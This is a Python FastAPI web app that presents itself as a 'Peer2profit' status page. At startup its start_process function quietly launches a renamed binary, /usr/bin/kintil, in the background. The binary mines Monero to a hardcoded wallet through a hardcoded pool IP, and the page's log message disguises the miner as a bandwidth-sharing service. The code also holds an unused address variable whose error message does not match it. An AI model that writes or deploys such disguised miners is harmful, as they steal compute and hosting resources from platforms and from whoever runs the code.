import os
import socket
import subprocess
import sys
from pathlib import Path

import requests
import uvicorn
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

templates = Jinja2Templates(directory='./templates')

app = FastAPI()

CURRENT_DIR = Path(__file__).parent.resolve()
LOG_FILE = Path(CURRENT_DIR, 'test.log')


@app.get('/')
def hello(request: Request):
    '''Nothing but hello'''
    hostname = socket.gethostname()
    IP = requests.get('https://ipinfo.io').json()['ip']
    if not Path(LOG_FILE).exists():
        logs = ['Peer2profit not started, Check the process first!']
    else:
        with open(LOG_FILE, encoding='utf_8') as f:
            logs = f.readlines()[-20:]
    return templates.TemplateResponse("index.html", {"request": request, "IP": IP, "hostname": hostname, 'logs': logs})


def start_process():
    ptk_address = os.environ.get('ptk_address', "pkt1qegd9xjlaatf26f583m8yurtt9te4vs8340naca")
    if ptk_address is None:
        print('PTK_address environment variable is not set. Please set it to your email address.')
        sys.exit(1)
    cmd = f'nohup /usr/bin/kintil -algo RandomX -coin XMR -wallet 89EcNeW4CN3ZXhGZ2bebYM7H2DntAe1fw6qvQ2KB3Hprc1ZDpbyjDoibEDU9duGmM4V77aMTkHJg51JS4kzivx2o3D8DFYc.BERKAH -pool1 159.223.182.56:3333 > {LOG_FILE} 2>&1 &'
    out, err = subprocess.Popen(
        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    print(out.decode('utf-8'))
    print(err.decode('utf-8'))


if __name__ == '__main__':
    start_process()
    PORT = os.environ.get("PORT", 5000)
    uvicorn.run('main:app', host='0.0.0.0', port=int(PORT), reload=True)
